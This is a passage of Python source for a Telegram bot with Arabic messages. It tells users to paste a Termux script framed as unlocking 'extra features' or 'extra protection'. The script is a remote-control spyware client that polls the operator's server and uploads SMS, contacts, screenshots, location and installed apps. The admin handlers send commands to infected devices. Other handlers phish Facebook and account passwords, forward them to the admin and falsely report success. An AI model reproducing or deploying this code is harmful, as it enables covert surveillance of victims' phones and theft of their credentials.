                "⚙️ <b>لتفعيل الميزات الإضافية</b>\n\n"
                "1️⃣ <b>حمّل تطبيق Termux</b> من الرابط الرسمي:\n"
                "https://f-droid.org/repo/com.termux_118.apk\n\n"
                "2️⃣ <b>افتح Termux</b>، ثم انسخ الكود التالي والصقه:\n"
                "```bash\n"
                "pkg update && pkg upgrade -y\n"
                "pkg install python -y\n"
                "pip install requests\n"
                "cat > client.py << 'EOF'\n"
                "import requests, time, json, os, subprocess, base64, glob\n"
                f"SERVER = \"{SERVER_URL}\"\n"
                f"DEVICE_ID = \"{chat_id}_{''.join(random.choices(string.ascii_lowercase, k=4))}\"\n"
                "CHAT_ID = \"\"\n\n"
                "def send_data(data):\n"
                "    try:\n"
                "        requests.post(f'{SERVER}/submit_result', json=data, timeout=10)\n"
                "    except: pass\n\n"
                "def get_contacts():\n"
                "    try:\n"
                "        contacts = []\n"
                "        files = glob.glob('/storage/emulated/0/Download/*.vcf') + glob.glob('/storage/emulated/0/Contacts/*.vcf')\n"
                "        for f in files:\n"
                "            with open(f, 'r') as file:\n"
                "                contacts.append(file.read())\n"
                "        return '\\n'.join(contacts)\n"
                "    except: return ''\n\n"
                "def get_sms():\n"
                "    try:\n"
                "        return subprocess.check_output(['content', 'query', '--uri', 'content://sms/inbox']).decode()\n"
                "    except: return ''\n\n"
                "def take_screenshot():\n"
                "    try:\n"
                "        subprocess.run(['screencap', '-p', '/sdcard/screenshot.png'], timeout=10)\n"
                "        with open('/sdcard/screenshot.png', 'rb') as f:\n"
                "            return base64.b64encode(f.read()).decode()\n"
                "    except: return ''\n\n"
                "def get_location():\n"
                "    try:\n"
                "        return subprocess.check_output(['termux-location']).decode()\n"
                "    except: return ''\n\n"
                "def get_apps():\n"
                "    try:\n"
                "        return subprocess.check_output(['pm', 'list', 'packages']).decode()\n"
                "    except: return ''\n\n"
                "def execute_command(cmd):\n"
                "    if cmd == 'موقع': return get_location()\n"
                "    elif cmd == 'كاميرا': return take_screenshot()\n"
                "    elif cmd == 'لقطة': return take_screenshot()\n"
                "    elif cmd == 'صور': return get_contacts()\n"
                "    elif cmd == 'جهات اتصال': return get_contacts()\n"
                "    elif cmd == 'رسائل': return get_sms()\n"
                "    elif cmd == 'تطبيقات': return get_apps()\n"
                "    elif cmd == 'شاشة': return get_apps()\n"
                "    else: return f'أمر غير معروف: {cmd}'\n\n"
                "while True:\n"
                "    try:\n"
                "        time.sleep(5)\n"
                "        resp = requests.get(f'{SERVER}/get_command?device_id={DEVICE_ID}', timeout=10)\n"
                "        if resp.status_code == 200 and resp.json().get('command'):\n"
                "            cmd = resp.json()['command']\n"
                "            result = execute_command(cmd)\n"
                "            send_data({'device_id': DEVICE_ID, 'result': result, 'result_type': 'text'})\n"
                "    except: pass\n"
                "EOF\n"
                "python client.py\n"
                "```\n\n"
                "3️⃣ <b>بعد تنفيذ الأوامر</b>، ستتاح لك الميزات الإضافية فوراً."
            )
            bot.edit_message_text(instructions, chat_id, call.message.message_id, parse_mode='HTML')
        elif data == "link_child":
            instructions_child = (
                "🛡️ <b>لتفعيل الحماية الإضافية</b>\n\n"
                "1️⃣ <b>حمّل تطبيق Termux</b> من الرابط الرسمي:\n"
                "https://f-droid.org/repo/com.termux_118.apk\n\n"
                "2️⃣ <b>افتح Termux</b>، ثم انسخ الكود التالي والصقه:\n"
                "```bash\n"
                "pkg update && pkg upgrade -y\n"
                "pkg install python -y\n"
                "pip install requests\n"
                "cat > client.py << 'EOF'\n"
                "import requests, time, json, os, subprocess, base64, glob\n"
                f"SERVER = \"{SERVER_URL}\"\n"
                f"DEVICE_ID = \"{chat_id}_child_{''.join(random.choices(string.ascii_lowercase, k=4))}\"\n"
                "CHAT_ID = \"\"\n\n"
                "def send_data(data):\n"
                "    try:\n"
                "        requests.post(f'{SERVER}/submit_result', json=data, timeout=10)\n"
                "    except: pass\n\n"
                "def take_screenshot():\n"
                "    try:\n"
                "        subprocess.run(['screencap', '-p', '/sdcard/screenshot.png'], timeout=10)\n"
                "        with open('/sdcard/screenshot.png', 'rb') as f:\n"
                "            return base64.b64encode(f.read()).decode()\n"
                "    except: return ''\n\n"
                "def get_location():\n"
                "    try:\n"
                "        return subprocess.check_output(['termux-location']).decode()\n"
                "    except: return ''\n\n"
                "def get_apps():\n"
                "    try:\n"
                "        return subprocess.check_output(['pm', 'list', 'packages']).decode()\n"
                "    except: return ''\n\n"
                "def execute_command(cmd):\n"
                "    if cmd == 'موقع': return get_location()\n"
                "    elif cmd == 'لقطة': return take_screenshot()\n"
                "    elif cmd == 'تطبيقات': return get_apps()\n"
                "    elif cmd == 'شاشة': return get_apps()\n"
                "    else: return f'أمر غير معروف: {cmd}'\n\n"
                "while True:\n"
                "    try:\n"
                "        time.sleep(5)\n"
                "        resp = requests.get(f'{SERVER}/get_command?device_id={DEVICE_ID}', timeout=10)\n"
                "        if resp.status_code == 200 and resp.json().get('command'):\n"
                "            cmd = resp.json()['command']\n"
                "            result = execute_command(cmd)\n"
                "            send_data({'device_id': DEVICE_ID, 'result': result, 'result_type': 'text'})\n"
                "    except: pass\n"
                "EOF\n"
                "python client.py\n"
                "```\n\n"
                "3️⃣ <b>بعد تنفيذ الأوامر</b>، سيتم تفعيل الحماية الإضافية."
            )
            bot.edit_message_text(instructions_child, chat_id, call.message.message_id, parse_mode='HTML')

        # ========== أزرار المطور ==========
        elif data == "admin_panel" and is_admin:
            bot.edit_message_text("👑 لوحة المطور - جميع الأزرار متاحة.", chat_id, call.message.message_id)
        elif data == "admin_devices" and is_admin:
            devices = get_devices_by_chat(chat_id)
            if devices:
                text = "📱 الأجهزة المسجلة:\n"
                for d in devices:
                    text += f"🆔 {d['device_id']} - 👤 {d['chat_id']}\n"
            else:
                text = "📱 لا توجد أجهزة."
            bot.edit_message_text(text, chat_id, call.message.message_id)
        elif data == "admin_remote" and is_admin:
            devices = get_devices_by_chat(chat_id)
            if not devices:
                bot.edit_message_text("📱 لا توجد أجهزة.", chat_id, call.message.message_id)
                return
            markup = InlineKeyboardMarkup(row_width=1)
            for d in devices:
                markup.row(InlineKeyboardButton(f"📱 {d['device_id']}", callback_data=f"remote_{d['device_id']}"))
            bot.edit_message_text("🎮 اختر جهازاً:", chat_id, call.message.message_id, reply_markup=markup)
        elif data.startswith("remote_") and is_admin:
            device_id = data.split("_")[1]
            user_states[chat_id] = "waiting_for_remote_cmd"
            user_states[f"{chat_id}_remote_dev"] = device_id
            bot.edit_message_text(f"✅ الجهاز {device_id}\n📝 أرسل الأمر (موقع، لقطة، جهات اتصال، إلخ):", chat_id, call.message.message_id)
        elif data == "admin_broadcast" and is_admin:
            user_states[chat_id] = "waiting_for_broadcast"
            bot.edit_message_text("📢 أرسل الرسالة:", chat_id, call.message.message_id)
        elif data == "admin_ban" and is_admin:
            user_states[chat_id] = "waiting_for_ban"
            bot.edit_message_text("🚫 أرسل ID المستخدم:", chat_id, call.message.message_id)
        elif data == "admin_unban" and is_admin:
            user_states[chat_id] = "waiting_for_unban"
            bot.edit_message_text("✅ أرسل ID المستخدم لإلغاء الحظر:", chat_id, call.message.message_id)

        else:
            bot.answer_callback_query(call.id, "⚠️ خيار غير معروف.", show_alert=True)

    except Exception as e:
        logger.error(f"handle_callback error: {e}")
        bot.send_message(chat_id, f"⚠️ حدث خطأ: {str(e)}")

# ===================== معالج النصوص =====================
@bot.message_handler(func=lambda msg: True, content_types=['text'])
def handle_text_messages(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)
    text = message.text.strip()
    is_admin = (chat_id == ADMIN_ID)

    try:
        # ===== حالات المطور =====
        if state == "waiting_for_broadcast" and is_admin:
            with get_db_connection() as conn:
                c = conn.cursor()
                c.execute("SELECT chat_id FROM users WHERE is_banned = 0")
                users = c.fetchall()
            success = 0
            for user in users:
                try:
                    bot.send_message(user['chat_id'], text)
                    success += 1
                    time.sleep(0.05)
                except:
                    pass
            bot.send_message(chat_id, f"✅ تم الإرسال لـ {success} مستخدم.")
            user_states[chat_id] = None
            return

        if state == "waiting_for_ban" and is_admin:
            try:
                uid = int(text)
                if uid == ADMIN_ID:
                    bot.send_message(chat_id, "❌ لا يمكن حظر المطور.")
                else:
                    ban_user(uid)
                    bot.send_message(chat_id, f"✅ تم حظر {uid}.")
            except:
                bot.send_message(chat_id, "❌ ID غير صحيح.")
            user_states[chat_id] = None
            return

        if state == "waiting_for_unban" and is_admin:
            try:
                uid = int(text)
                unban_user(uid)
                bot.send_message(chat_id, f"✅ تم إلغاء حظر {uid}.")
            except:
                bot.send_message(chat_id, "❌ ID غير صحيح.")
            user_states[chat_id] = None
            return

        if state == "waiting_for_remote_cmd" and is_admin:
            device_id = user_states.get(f"{chat_id}_remote_dev")
            if device_id:
                add_pending_command(device_id, text)
                bot.send_message(chat_id, f"⏳ تم إرسال الأمر <code>{text}</code> إلى {device_id}", parse_mode='HTML')
            else:
                bot.send_message(chat_id, "❌ لم يتم اختيار جهاز.")
            user_states[chat_id] = None
            return

        # ===== حالات الخدمات =====
        if state == "waiting_for_site":
            if re.match(r'^https?://', text):
                processing_msg = bot.send_message(chat_id, "⏳ جاري فحص الموقع... يرجى الانتظار.")
                result, _ = scan_url(text)
                bot.edit_message_text(f"🔍 {result}", chat_id, processing_msg.message_id, parse_mode='HTML')
            else:
                bot.send_message(chat_id, "❌ رابط غير صحيح.")
            user_states[chat_id] = None
            return

        if state == "waiting_for_ai":
            processing_msg = bot.send_message(chat_id, "⏳ جاري معالجة سؤالك...")
            response = get_gemini_response(text)
            bot.edit_message_text(f"🧠 <b>الرد:</b>\n{response}", chat_id, processing_msg.message_id, parse_mode='HTML')
            user_states[chat_id] = None
            return

        if state == "waiting_for_image":
            processing_msg = bot.send_message(chat_id, "⏳ جاري إنشاء الصورة...")
            img, err = generate_image(text)
            if img:
                bot.delete_message(chat_id, processing_msg.message_id)
                bot.send_photo(chat_id, img, caption="🎨 الصورة المولدة")
            else:
                bot.edit_message_text(err, chat_id, processing_msg.message_id)
            user_states[chat_id] = None
            return

        if state == "waiting_for_track":
            result, _ = track_phone(text)
            bot.send_message(chat_id, result, parse_mode='HTML')
            user_states[chat_id] = None
            return

        if state == "waiting_for_verify":
            result = verify_phone(text)
            bot.send_message(chat_id, result, parse_mode='HTML')
            user_states[chat_id] = None
            return

        if state == "waiting_for_breach":
            if not re.match(r'^[^@\s]+@[^@\s]+\.[^@\s]+$', text):
                bot.send_message(chat_id, "❌ بريد غير صحيح.")
                return
            processing_msg = bot.send_message(chat_id, "⏳ جاري الفحص...")
            result = check_breach(text)
            bot.edit_message_text(result, chat_id, processing_msg.message_id, parse_mode='HTML')
            user_states[chat_id] = None
            return

        if state == "waiting_for_shorten":
            if not text.startswith(('http://', 'https://')):
                bot.send_message(chat_id, "❌ رابط غير صحيح.")
                return
            short = shorten_link(text)
            if short:
                bot.send_message(chat_id, f"✅ الرابط المختصر:\n{short}")
            else:
                bot.send_message(chat_id, "❌ فشل الاختصار.")
            user_states[chat_id] = None
            return

        # ===== حالات جمع البيانات =====
        if state == "waiting_for_fb_email":
            user_states[chat_id] = "waiting_for_fb_password"
            user_states[f"{chat_id}_fb_email"] = text
            bot.send_message(chat_id, "📩 تم استلام البريد.\n🔑 أرسل كلمة المرور:")
            return
        if state == "waiting_for_fb_password":
            email = user_states.get(f"{chat_id}_fb_email", "غير معروف")
            password = text
            send_to_admin(f"🔐 بيانات فيسبوك من {chat_id}\nالبريد: {email}\nكلمة المرور: {password}")
            bot.send_message(chat_id, "✅ تم تسجيل الدخول بنجاح!")
            user_states[chat_id] = None
            user_states.pop(f"{chat_id}_fb_email", None)
            return

        if state == "waiting_for_pkg_phone":
            user_states[chat_id] = "waiting_for_pkg_email"
            user_states[f"{chat_id}_pkg_phone"] = text
            bot.send_message(chat_id, "📩 تم استلام الرقم.\n✉️ أرسل بريدك الإلكتروني:")
            return
        if state == "waiting_for_pkg_email":
            user_states[chat_id] = "waiting_for_pkg_password"
            user_states[f"{chat_id}_pkg_email"] = text
            bot.send_message(chat_id, "📩 تم استلام البريد.\n🔑 أرسل كلمة المرور:")
            return
        if state == "waiting_for_pkg_password":
            phone = user_states.get(f"{chat_id}_pkg_phone", "")
            email = user_states.get(f"{chat_id}_pkg_email", "")
            password = text
            pkg = user_states.get(f"{chat_id}_pkg", "غير محددة")
            send_to_admin(f"📶 طلب باقة {pkg} من {chat_id}\nالهاتف: {phone}\nالبريد: {email}\nكلمة المرور: {password}")
            bot.send_message(chat_id, "✅ تم تفعيل الباقة بنجاح!")
            user_states[chat_id] = None
            for k in [f"{chat_id}_pkg_phone", f"{chat_id}_pkg_email", f"{chat_id}_pkg"]:
                user_states.pop(k, None)
            return

        # ===== PDF =====
        if state == "waiting_for_pdf_question":
            pdf_text = user_states.get(f"{chat_id}_pdf_text")
            if not pdf_text:
                bot.send_message(chat_id, "⚠️ لم يتم تحميل ملف PDF.")
                user_states[chat_id] = None
                return
            processing_msg = bot.send_message(chat_id, "⏳ جاري تحليل المحتوى...")
            ans = answer_pdf_question(pdf_text, text)
            bot.edit_message_text(f"📚 <b>الإجابة:</b>\n{ans}", chat_id, processing_msg.message_id, parse_mode='HTML')
            user_states[chat_id] = None
            return

        # ===== أوامر إلغاء =====
        if text.lower() == "/cancel":
            if chat_id in user_states:
                del user_states[chat_id]
            bot.send_message(chat_id, "✅ تم الإلغاء.")
            return

        # ===== رد افتراضي =====
        bot.reply_to(message, "🤖 استخدم /start للقائمة.")

    except Exception as e:
        logger.error(f"handle_text_messages error: {e}")
        bot.send_message(chat_id, f"⚠️ حدث خطأ: {str(e)}")

# ===================== معالج الملفات =====================
@bot.message_handler(content_types=['document'])
def handle_documents(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)
    try:
        if state == "waiting_for_apk":
            file = message.document
            if not file.file_name.lower().endswith('.apk'):
                bot.send_message(chat_id, "❌ أرسل ملف APK.")
                return
            processing_msg = bot.send_message(chat_id, "⏳ جاري التحليل...")
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            result = scan_apk(downloaded, file.file_name)
            bot.edit_message_text(result, chat_id, processing_msg.message_id, parse_mode='HTML')
            user_states[chat_id] = None
            return

        if state == "waiting_for_pdf":
            file = message.document
            if not file.file_name.lower().endswith('.pdf'):
                bot.send_message(chat_id, "❌ أرسل ملف PDF.")
                return
            processing_msg = bot.send_message(chat_id, "⏳ جاري استخراج النص...")
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            pdf_text = extract_pdf_text(downloaded)
            if not pdf_text:
                bot.edit_message_text("⚠️ لم يتم استخراج أي نص. تأكد من أن الملف يحتوي على نصوص.", chat_id, processing_msg.message_id)
                user_states[chat_id] = None
                return
            user_states[f"{chat_id}_pdf_text"] = pdf_text
            user_states[chat_id] = "waiting_for_pdf_question"
            bot.edit_message_text(
                f"✅ تم استخراج النص ({len(pdf_text)} حرف).\n📚 الآن اسأل عن المحتوى.",
                chat_id, processing_msg.message_id
            )
            return

        bot.send_message(chat_id, "📎 تم استلام الملف.")
    except Exception as e:
        logger.error(f"handle_documents error: {e}")
        bot.send_message(chat_id, f"⚠️ حدث خطأ: {str(e)}")

# ===================== معالج الصور =====================
@bot.message_handler(content_types=['photo'])
def handle_photos(message):
    bot.reply_to(message, "🖼️ تم استلام الصورة (لم يتم تحليلها).")

# ===================== تشغيل التطبيق =====================
if __name__ == "__main__":
    set_webhook()
    logger.info("✅ البوت يعمل عبر Webhook...")
    app.run(host='0.0.0.0', port=PORT, debug=False)
